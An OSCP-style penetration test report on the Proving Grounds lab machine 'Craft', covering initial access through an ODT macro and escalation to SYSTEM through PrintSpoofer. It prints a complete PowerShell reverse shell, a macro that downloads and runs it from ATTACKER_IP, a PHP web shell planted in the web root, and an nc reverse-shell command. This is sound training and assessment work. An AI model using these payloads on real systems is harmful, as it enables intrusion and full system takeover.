# PG Practice Craft - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-5-6

---

## 1. Executive Summary

A penetration test was conducted against the target host “Craft” in the Offensive Security Proving Grounds Practice environment. The assessment identified a vulnerable file upload functionality that allowed malicious OpenDocument Text (ODT) files containing macros to be uploaded and executed.

Initial access was achieved by abusing LibreOffice macro execution to obtain code execution as the user `thecybergeek`. Post-exploitation enumeration revealed writable access to the XAMPP web root directory and the presence of the `SeImpersonatePrivilege` privilege assigned to the apache service account.

Privilege escalation to `NT AUTHORITY\SYSTEM` was achieved using `PrintSpoofer64.exe`, resulting in full compromise of the target system.

---

## 2. Scope

- **Target:** 192.168.173.169
- **Environment:** PG Practice Craft
- **Testing Window:** 2026-4-20 to 2026-5-6
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP-port scan was run with Nmap:

Command:

```
nmap -p- -sC -sV 192.168.173.169 -T4 -oA craft_tcp -Pn
```

Output:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
```

Interpretation:

The target exposed an HTTP service on port 80 running Apache on Windows with PHP enabled.

### Hostname Resolution

The following entry was added to `/etc/hosts`.

Command:

```
echo "192.168.173.169 craft.offsec" | sudo tee -a /etc/hosts
```

Interpretation:

This allowed the virtual host `craft.offsec` to resolve locally.

---

## 5. Enumeration

### Website Enumeration

Browsing to the website revealed a resume upload feature.

An email address was also disclosed:

```
admin@craft.offsec
```

Interpretation:

The upload functionality appeared to accept only .odt files, indicating LibreOffice or OpenOffice document processing on the backend.

### File Upload Testing

A standard file upload test was performed.

Output:

```
File is not valid. Please submit ODT file
```

Interpretation:

The application validated uploads based on ODT format requirements.

---

## 6. Initial Access

### PowerShell Reverse Shell Payload

A PowerShell reverse shell payload was prepared and hosted on the attacker machine.

Payload

```
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',80);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex ". { $data } 2>&1" | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};
$client.Close()
```

### Macro Execution

The malicious macro was created to download and execute the PowerShell reverse shell.

Macro Code

```
Sub Main
shell("cmd /c powershell iwr http://ATTACKER_IP/revshell.ps1 -o C:\Windows\Tasks\revshell.ps1")
shell("cmd /c powershell C:\Windows\Tasks\revshell.ps1")
End Sub
```

Interpretation

The macro downloaded and executed a PowerShell reverse shell payload from the attacker machine.

### Reverse Shell Connection

The document was uploaded twice to trigger execution.

Listener

```
rlwrap nc -lnvp 80
```
Output

```
PS C:\Program Files\LibreOffice\program>
```

Command

```
whoami
hostname
```

Output

```
craft\thecybergeek
CRAFT
```

Interpretation

Initial access was obtained as the low-privileged user `thecybergeek`.

---

## 7. Post-Exploitation

### Basic Enumeration

Commands

```
whoami /priv
whoami /groups
systeminfo
```

Interpretation

Enumeration identified a Windows Server 2019 system.

### User Enumeration

Command

```
net user
```

Output

```
Administrator
apache
thecybergeek
```

Command

```
net user apache
```

Interpretation

The apache account was identified as a local user associated with the web service.

### Writable Web Root Discovery

The XAMPP web root directory was tested for write access.

Commands

```
cd C:\xampp\htdocs

echo "writeTest" > writeTest.txt

dir
```

Output

```
writeTest.txt
```

Interpretation

The current user possessed write access to the web server document root.

### PHP Web Shell Deployment

A simple PHP command execution shell was created.

PHP Web Shell

```
<pre>
<?php
system($_GET['cmd']);
?>
</pre>
```

The file was hosted on the attacker machine and downloaded to the target.

Command

```
iwr http://ATTACKER_IP/cmd.php -o C:\xampp\htdocs\cmd.php
```

Interpretation

This provided browser-based command execution through the web server.

### Command Execution Validation

URL

```
http://craft.offsec/cmd.php?cmd=whoami
```

Output

```
craft\apache
```

Interpretation

Commands executed through the web server context as the apache account.

### Privilege Enumeration

URL

```
http://craft.offsec/cmd.php?cmd=whoami /priv
```

Output

```
SeImpersonatePrivilege Enabled
```

Interpretation

The apache account possessed `SeImpersonatePrivilege`, making token impersonation attacks possible.

---

## 8. Privilege Escalation

### Transfer Privilege Escalation Tools

Commands

```
iwr http://192.168.45.180/PrintSpoofer64.exe -o C:\xampp\htdocs\PrintSpoofer64.exe

iwr http://192.168.45.180/nc64.exe -o C:\xampp\htdocs\nc64.exe
```

Interpretation

`PrintSpoofer64.exe` was transferred to exploit `SeImpersonatePrivilege`.

### Trigger SYSTEM Shell

A reverse shell was executed using PrintSpoofer.

URL

```
http://craft.offsec/cmd.php?cmd=C:\xampp\htdocs\PrintSpoofer64.exe -c "C:\xampp\htdocs\nc64.exe 192.168.45.180 443 -e cmd"
```

Listener

```
rlwrap nc -lnvp 443
```

Output

```
nt authority\system
```

Commands

```
whoami
hostname
```

Output

```
nt authority\system
CRAFT
```

Interpretation

Privilege escalation to SYSTEM was successful.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\thecybergeek\Desktop\local.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Insecure File Upload Allowing Malicious Macro Execution

**Severity:** Critical

**Description:**
The web application allowed users to upload document files containing embedded macros (e.g., LibreOffice or Microsoft Office macros).

**Impact:**
Attackers could upload malicious documents that execute arbitrary commands when opened by a user, potentially leading to remote code execution.

**Recommendation:**
Disable macro execution for uploaded documents, sanitize uploaded files before processing, and restrict accepted file types to trusted formats.

### **Finding:** Writable Web Root Directory

**Severity:** High

**Description:**
A low-privileged user had write access to the web server document root directory.

**Impact:**
Attackers could upload arbitrary server-side scripts (e.g., PHP web shells) and gain persistent remote code execution through the web application.

**Recommendation:**
Restrict write permissions on web directories, separate upload locations from executable directories, and enforce least-privilege access controls.

### **Finding:** SeImpersonatePrivilege Assigned to Service Account

**Severity:** Critical

**Description:**
A service account (e.g., `apache`) possessed the SeImpersonatePrivilege privilege, allowing token impersonation attacks.

**Impact:**
Attackers could exploit token impersonation vulnerabilities such as PrintSpoofer to escalate privileges to SYSTEM.

**Recommendation:**
Remove unnecessary impersonation privileges from service accounts, apply security patches, and ensure services run with least privilege.

---

## 11. Appendix

Malicious ODT Macro Reverse Shell - 
[https://medium.com/@akshay__0/initial-access-via-malicious-odt-macro-ac7f5d15796d](https://medium.com/@akshay__0/initial-access-via-malicious-odt-macro-ac7f5d15796d)

Powershell Reverse Shell One-Liner - 
[https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)